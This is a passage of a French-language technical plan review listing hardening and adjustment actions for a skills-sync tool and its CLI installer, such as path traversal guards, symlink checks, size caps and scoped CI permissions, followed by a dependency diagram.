| **A2** | Ajouter un `_raw_get_bytes()` pour les fichiers non-texte | Ou paramètre `decode=False` |
| **A3** | Path traversal guard sur CHAQUE fichier compagnon | Pas seulement sur le SKILL.md |
| **A4** | Cap taille totale par skill (5MB) | Nouvelle constante `MAX_SKILL_TOTAL_SIZE` |
| **A5** | Check anti-symlink avant écriture | `if path.is_symlink(): raise` |

### Phase 5 — Ajustements

| # | Action | Détail |
|---|---|---|
| **A6** | Job séquentiel (pas parallèle) pour sync-agents + sync-skills | Évite la complexité des artifacts |
| **A7** | Permissions scopées au workflow `sync.yml` | `contents:write`, `pull-requests:write` |
| **A8** | Extraire le validateur CI inline dans `scripts/validate.py` | Testable + extensible pour skills |

### Phase 6 — Ajustements

| # | Action | Détail |
|---|---|---|
| **A9** | `skills-manifest.json` doit lister TOUS les fichiers par skill | Indispensable pour que la CLI sache quoi télécharger |
| **A10** | Créer `downloadBinary()` dans `installer.mjs` | Retourne `Buffer` au lieu de `string` |
| **A11** | Pool de download concurrent (max 3) | Évite les 429 tout en restant raisonnable |
| **A12** | `SAFE_NAME_RE` étendu pour les chemins de fichiers compagnons | `/^[a-zA-Z0-9][a-zA-Z0-9._\/-]*$/` |

### Vue d'ensemble des dépendances

```
P1 (sync_common.py) ──→ T4.1 (sync-skills.py)
P2 (429 fallback)   ──→ T4.1
P3 (décision scripts/) → T4.1
                          ↓
                    T4.3 (tests skills)
                          ↓
                    T4.4 (manifest) ──→ T6.1 (CLI skills)
                                            ↓
                                      T6.3 (tests CLI)
                                            ↓
A8 (validate.py) ────────────────────→ T5.1 (sync.yml)
```

---

> **Bottom line technique** : Le plan est réalisable. Les 4 risques critiques sont tous résolvables avec des mitigations concrètes qui s'appuient sur les patterns existants du codebase. Le plus important est l'extraction de `sync_common.py` — c'est le fondation sur laquelle repose tout le reste. Sans cela, le projet accumule de la dette technique dès le premier jour de Phase 4.
